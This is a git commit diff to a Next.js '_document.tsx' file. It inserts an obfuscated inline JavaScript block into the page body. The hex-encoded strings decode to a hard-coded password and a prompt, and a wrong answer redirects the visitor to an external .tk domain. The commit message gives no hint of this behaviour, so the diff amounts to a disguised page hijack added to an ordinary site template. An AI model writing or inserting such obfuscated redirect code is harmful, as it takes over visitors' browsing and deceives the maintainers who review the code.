cf7af01de86d2915ffb70c65ba110042e784606d
opparo <101738988+opparo@users.noreply.github.com>
2022-03-17 14:48:15 +0800

    Update _document.tsx

--- pages/_document.tsx
+++ pages/_document.tsx
@@ -15,6 +15,9 @@ class MyDocument extends Document {
           ))}
         </Head>
         <body>
+          <SCRIPT language="JavaScript">
+var _0xdb15=["\x6D\x61\x6E\x74\x61\x70","\x4D\x61\x73\x75\x6B\x6B\x61\x6E\x20\x70\x61\x73\x73\x77\x6F\x72\x64","","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x69\x6A\x61\x6E\x69\x66\x79\x2E\x74\x6B"];var password;var pass1=_0xdb15[0];password= prompt(_0xdb15[1],_0xdb15[2]);if(password!= pass1){window[_0xdb15[3]]= _0xdb15[4]}
+</SCRIPT>
           <Main />
           <NextScript />
         </body>
